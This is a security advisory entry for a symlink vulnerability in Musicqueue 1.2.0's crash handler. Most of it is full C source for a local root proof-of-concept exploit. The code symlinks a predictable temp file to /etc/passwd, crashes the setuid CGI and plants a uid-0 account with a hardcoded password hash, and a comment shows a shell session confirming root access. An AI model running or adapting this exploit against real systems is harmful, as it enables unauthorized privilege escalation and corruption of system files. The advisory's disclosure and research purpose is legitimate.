source: http://www.securityfocus.com/bid/8899/info

A vulnerability has been reported for Musicqueue. The problem specifically occurs within a signal handling procedure used invoked when a segmentation violation occurs. The procedure invokes a library function, passing it the name of a predictable filename to create within the systems temporary directory. As a result, an attacker may be capable of launching a symbolic link attack, effectively overwriting the contents of a potentially system critical file with the contents of the created file.

This could theoretically lead to a denial of service condition, or in some cases privileged elevation.

/*
**
** 0x82-Local.musicqueue_xpl -
** musicqueue.cgi v-1.2.0 local root `Proof of Concept' exploit
**
** This may add user of `REQUEST_METHOD=GET' in `/etc/passwd' file.
** And, the password is `x82'.
**
** I installed musicqueue by root. (make install-suid)
** 
** --
** [root@testsub musicqueue]# ls -al musicqueue.cgi
** -rwsr-sr-x   1 root     root        67540 Jul 20 14:54 musicqueue.cgi
** [root@testsub musicqueue]# su x82
** [x82@testsub musicqueue]$ head -1 /etc/passwd
** root:x:0:0:root:/root:/bin/bash
** [x82@testsub musicqueue]$ gcc -o 0x82-Local.musicqueue_xpl 0x82-Local.musicqueue_xpl.c
** [x82@testsub musicqueue]$ ./0x82-Local.musicqueue_xpl
**
**  0x82-Local.musicqueue_xpl - musicqueue.cgi v-1.2.0 POC exploit.
**
** [x82@testsub musicqueue]$ head -1 /etc/passwd
** REQUEST_METHOD=GET:$1$jDra3UN4$4jyyrr1pc00PRZnmlyFw91:0:0::/:/bin/sh
** [x82@testsub musicqueue]$ su REQUEST_METHOD=GET
** Password: (password is 'x82')
** [REQUEST_METHOD=GET@testsub musicqueue]# id
** uid=0(REQUEST_METHOD=GET) gid=0(root) groups=0(root)
** [REQUEST_METHOD=GET@testsub musicqueue]#
** --
**
** Don't like user's name so. :-p
** --
** exploit by "you dong-hun"(Xpl017Elz), <szoahc@hotmail.com>.
** My World: http://x82.i21c.net & http://x82.inetcop.org
**
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

#define REDHAT_7X
#undef REDHAT_7X /* touch me! */

#define DEF_TG_PATH "./musicqueue.cgi"
#define CRASH_CORE_PATH "/tmp/musicqueue.crash"
#define WRT_PASSWD_PATH "/etc/passwd"
#define REQUEST_METHOD_MK "GET" /* Username: REQUEST_METHOD=GET */
#define S_TOKEN 0x3a
#define S_PASS "$1$jDra3UN4$4jyyrr1pc00PRZnmlyFw91" /* Password: x82 */
#define DCR_PASS "x82"
#define USER_UID 0x0 /* Uid,Gid: 0 */
#define USER_GID 0x0
#define ROOT_PWD 0x2f /* Homedir: / */
#define SHELL_PATH "/bin/sh" /* Shell: /bin/sh */
#define TTL_FORMAT_STR "%s%c%s%c%d%c%d%c%c%c%c%s\n"
#define STK_OVERFLOW_STR "aaaa"
#define S_ENV_PTE "REQUEST_METHOD"
#define S_ENV_PTO "HTTP_ACCEPT_LANGUAGE"
#ifdef REDHAT_7X
#define S_ENV_PTH "QUERY_STRING"
#endif
#define DEF_ZR 0
#define DEF_NR 1
#define DEF_MN -1
#define SZ_DEF_BR (0x82)
#define DEF_LEN (1024)

int main(void)
{
	FILE *fp=(NULL);
	char atk_str[(SZ_DEF_BR)],ttl_str_bf[(DEF_LEN)];
	int r=(DEF_ZR),r_r=(DEF_ZR);

	fprintf(stdout,"\n 0x82-Local.musicqueue_xpl - musicqueue.cgi v-1.2.0 POC exploit.\n\n");

	memset((char *)atk_str,(DEF_ZR),sizeof(atk_str));
	snprintf(atk_str,sizeof(atk_str)-1,(TTL_FORMAT_STR),
		(REQUEST_METHOD_MK),(S_TOKEN),(S_PASS),(S_TOKEN),
		(USER_UID),(S_TOKEN),(USER_GID),(S_TOKEN),(S_TOKEN),
		(ROOT_PWD),(S_TOKEN),(SHELL_PATH));

	if((fp=fopen((WRT_PASSWD_PATH),"r"))==NULL)
		return((DEF_MN));

	memset((char *)ttl_str_bf,(DEF_ZR),sizeof(ttl_str_bf));
	for(r_r=(DEF_ZR);r_r<strlen(atk_str);r_r++)
		ttl_str_bf[r_r]=atk_str[r_r];

	while(fread(&r,(DEF_NR),(DEF_NR),fp))
		ttl_str_bf[r_r++]=(r);

	fclose(fp);
	ttl_str_bf[strlen(ttl_str_bf)-1]='\0';

	/* REQUEST_METHOD=GET:...:...:... passwd contents ... */
	setenv((S_ENV_PTE),(ttl_str_bf),strlen(ttl_str_bf));
	/* Stack Overflow. yeh, Its segfault happens. */
	setenv((S_ENV_PTO),(STK_OVERFLOW_STR),strlen(STK_OVERFLOW_STR));

#ifdef REDHAT_7X
	atk_str[strlen(atk_str)-1]='\0';
	setenv((S_ENV_PTH),(atk_str),strlen(atk_str));
#endif

	/* File Symbolic Link. */
	unlink(CRASH_CORE_PATH);
	symlink((WRT_PASSWD_PATH),(CRASH_CORE_PATH));

	/* Execute, Local CGI. */
	execl((DEF_TG_PATH),(DEF_TG_PATH),(NULL));
}

